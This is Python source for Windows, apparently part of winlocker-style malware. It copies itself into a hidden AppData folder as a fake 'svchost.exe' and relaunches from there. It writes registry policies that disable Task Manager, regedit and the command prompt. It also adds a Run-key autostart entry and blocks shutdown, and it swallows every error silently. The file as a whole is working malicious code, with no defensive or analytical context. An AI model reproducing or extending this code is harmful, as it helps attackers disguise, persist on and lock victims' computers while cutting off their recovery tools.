import os
import sys
import winreg
import shutil
import subprocess
import ctypes

def hide_process():
    """Скрывает процесс в AppData под именем svchost.exe"""
    appdata = os.getenv('APPDATA')
    hidden_dir = os.path.join(appdata, "WindowsCache")
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir, exist_ok=True)
        ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 2)
    
    hidden_script = os.path.join(hidden_dir, "svchost.exe")
    current_script = os.path.abspath(sys.argv[0])
    
    if current_script != hidden_script:
        try:
            shutil.copy2(current_script, hidden_script)
            if getattr(sys, 'frozen', False):
                subprocess.Popen([hidden_script], shell=True)
            else:
                subprocess.Popen([sys.executable, hidden_script], shell=True)
            sys.exit()
        except: pass

def set_policies(enable):
    """Блокировка диспетчера задач и regedit"""
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        val = 0 if enable else 1
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, val)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, val)
        winreg.CloseKey(key)
        
        # Блокировка CMD
        key_cmd = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_cmd, "DisableCMD", 0, winreg.REG_DWORD, val)
        winreg.CloseKey(key_cmd)
    except: pass

def set_autostart(enable, app_name):
    """Добавление/удаление из автозагрузки"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        if enable: 
            hidden_path = os.path.join(os.getenv('APPDATA'), "WindowsCache", "svchost.exe")
            cmd = f'"{hidden_path}"' if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{hidden_path}"'
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)
        else:
            try: winreg.DeleteValue(key, app_name)
            except: pass
        winreg.CloseKey(key)
    except: pass

def block_shutdown(enable):
    """Блокировка выключения ПК"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        val = 0 if enable else 1
        winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, val)
        winreg.CloseKey(key)
    except: pass